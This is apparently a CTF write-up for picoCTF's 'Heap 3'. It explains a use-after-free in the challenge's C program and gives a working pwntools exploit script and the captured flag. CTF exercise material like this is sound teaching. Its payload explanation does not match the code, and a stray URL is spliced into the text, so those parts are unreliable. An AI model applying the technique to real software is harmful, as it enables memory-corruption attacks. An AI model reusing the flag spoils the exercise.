---
layout: post
title:  "Heap 3"
description: Leveraging a UAF vulnerability to manipulate heap allocation
date:   2024-10-26
tags: ["Medium", "Buffer Overflow", "Binary Exploitation"]
category: [CTF,picoCTF]
comments: true
contents: false
---

{: .prompt-info }
> **Provided By**  
> [Rivers](https://rivers.sh) <- visit their site!


## Challenge Info
This program mishandles memory. Can you exploit it to get the flag? Download the binary [here](https://artifacts.picoctf.net/c_tethys/5/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/5/chall.c).

Additional details will be available after launching your challenge instance.

## Understanding chall.c

The code for your convenience:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

- Defines a constant for the max size of the flag string (`FLAGSIZE_MAX`).
- A structure `object` is defined with 4 character arrays (`a[10]`, `b[10]`,`c[10]`, `flag[5]`).
- Pointer `x` is declared globally, but not yet pointing to anything.
- `init()` functionhttps://chirpy.cotes.page/ is declared, it executes `x = malloc(sizeof(object))`, ensuring that enough memory is reserved for all of struct's members (`a[10]`, `b[10]`,`c[10]`, and `flag[5]`. Additionally, the global pointer `x` is now set to point to this memory block that will hold the previously defined `object` struct.) There's also `int num_allocs`, but this is unused.
- `strncpy()` copies the string `"bico"` into the `flag` member/field of the `object` that `x` is pointing to.
- `alloc_object()` function is declared. It begins by prompting us to input the size of the memory allocation that they want to make.
    - Then, an integer variable `size` is initialized in order to store the size of the allocation. `scanf("%d", &size)` reads an integer input from us and then stores it in the previously initialized `size` variable.
    - Essentially, the program expects us to enter a value that represents the number of bytes we want to allocate.
- `check_win()` function is declared. It checks if `x->flag` matches with `'pico'`. And if it does, then we get our flag. This is essentially the 'win' condition.
- `alloc_object` function is declared, it prompts us to enter a size for dynamic allocation, it then reads an integer, and allocates memory accordingly. Finally, it accepts input to populate this allocated space.

## Vulnerabilities
- Use-After-Free [(UAF)](https://cwe.mitre.org/data/definitions/416.html) vulnerability, because while the `free_memory()` function does free the memory block associated with `x`, it's vulnerable because if `check_win()` is called afterward, then `x->flag` can still be accessed.
- Buffer overflow vulnerability: while the `flag` member in `object` is only 5 bytes, making it very limited, because of `alloc_object`, we could specify a much larger input for the memory allocated to `alloc`. So, if this memory isn't handled correctly, then we can just overwrite memory structures adjacent to `alloc` (hence the buffer overflow).

Before proceeding with the solution, I'll paste the program's interface so that it's easier to visualize:
```terminal
> nc tethys.picoctf.net 62002

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice:
```


## The Plan
So, to exploit this program, we can leverage the UAF vulnerability that I previously discussed. If we combine this with heap allocation manipulation (via buffer overflow), we can overwrite a specific field in a freed structure (`x->flag`) with the string `"pico"`. This is how it would look like step by step:
1. We select option `5` to **free x**.
2. We select option `2` to **allocate** a new block of memory, which is likely to use the same memory area that `x` was previously occupying, because they're goingto have similar size requirements.
    - The allocation size will be between 20 and 40, this way, we increase the likelihood that our new allocation will overlap with the previously freed `object` struct.
    - Recall that the `object` struct has 4 members, for a total of 35 bytes.
    ```c
    typedef struct {
  char a[10]; // ten bytes
  char b[10]; // ten bytes
  char c[10]; // ten bytes
  char flag[5]; // 5 bytes
} object;
    ```
3. While still in the "allocate object" option, we now input a payload string that will contain `"pico"` at the end to overwrite the previous `flag` value `"bico"`.
4. Select option 4 ("Check for win") and get our flag!

## Solution

The [pwntools](https://docs.pwntools.com/en/stable/) payload that I came up with is as follows:

```py
from pwn import *

r = remote('tethys.picoctf.net',51280)

r.sendline(b'5')
r.sendline(b'2')

r.sendline(b'40')
payload = b'A' * 30 + b'pico'


r.sendline(payload)
r.sendline(b'4')
r.interactive()
```
All of the `r.sendline`'s are for selecting options in the interface. As for the actual payload, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the `flag` field in the `object` struct has a 5 byte space, due to the program accounting for a [null byte](https://null-byte.wonderhowto.com/newest/).

flag: `picoCTF{now_thats_free_real_estate_a7381726}`
